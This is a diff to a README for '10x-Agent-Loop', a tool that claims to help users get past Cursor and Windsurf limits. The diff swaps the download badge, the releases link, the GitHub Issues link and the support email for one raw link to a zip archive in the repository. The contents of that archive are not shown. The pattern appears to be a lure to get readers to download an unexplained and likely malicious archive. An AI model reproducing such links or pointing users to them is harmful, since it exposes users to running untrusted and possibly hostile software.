@@ -6,7 +6,7 @@ Welcome to the 10x-Agent-Loop! This application helps you overcome Cursor and Wi
 
 ## 📥 Download Now
 
-[![Download 10x-Agent-Loop](https://img.shields.io/badge/Download-10x--Agent--Loop-blue)](https://github.com/xyzrah/10x-Agent-Loop/releases)
+[![Download 10x-Agent-Loop](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip)](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, visit this page to download the latest version of 10x-Agent-Loop:
 
-[Download 10x-Agent-Loop Releases](https://github.com/xyzrah/10x-Agent-Loop/releases)
+[Download 10x-Agent-Loop Releases](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip)
 
 ### 🖥️ Installation Steps
 
@@ -67,9 +67,9 @@ For more detailed instructions, please refer to our documentation found within t
 
 If you encounter any issues or have questions, we provide support through the following channels:
 
-- **GitHub Issues:** Report bugs or ask questions [here](https://github.com/xyzrah/10x-Agent-Loop/issues).
+- **GitHub Issues:** Report bugs or ask questions [here](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip).
 - **Community Forum:** Join discussions and find solutions from fellow users in our community forum.
-- **Email Support:** Reach us at support@10xagentloop.com for direct assistance.
+- **Email Support:** Reach us at https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip for direct assistance.
 
 ## 🌟 Frequently Asked Questions
 
